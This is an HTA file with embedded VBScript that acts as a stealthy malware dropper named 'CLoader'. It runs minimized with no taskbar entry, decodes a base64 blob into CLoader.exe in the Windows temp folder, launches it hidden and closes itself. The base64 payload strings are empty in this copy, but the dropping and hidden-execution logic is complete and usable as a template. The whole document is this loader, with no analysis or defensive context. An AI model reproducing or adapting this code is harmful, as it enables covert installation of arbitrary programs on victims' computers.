<html>
<head>
<HTA:APPLICATION ID="loader" APPLICATIONNAME="CLoader" BORDER="thin" BORDERSTYLE="normal" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize">
<script language="VBScript">
Dim b64Data
b64Data = ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""
b64Data = b64Data & ""

Function Base64ToBinaryFile(b64, outPath)
    Dim xml, stream
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Set stream = CreateObject("ADODB.Stream")
    xml.LoadXml "<root />"
    xml.documentElement.dataType = "bin.base64"
    xml.documentElement.text = b64

    stream.Type = 1
    stream.Open
    stream.Write xml.documentElement.nodeTypedValue
    stream.SaveToFile outPath, 2
    stream.Close
End Function

Dim fso, shell, exePath
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

exePath = fso.GetSpecialFolder(2) & "\CLoader.exe"

Call Base64ToBinaryFile(b64Data, exePath)

shell.Run Chr(34) & exePath & Chr(34), 0, False

window.close
</script>
</head>
<body></body>
</html>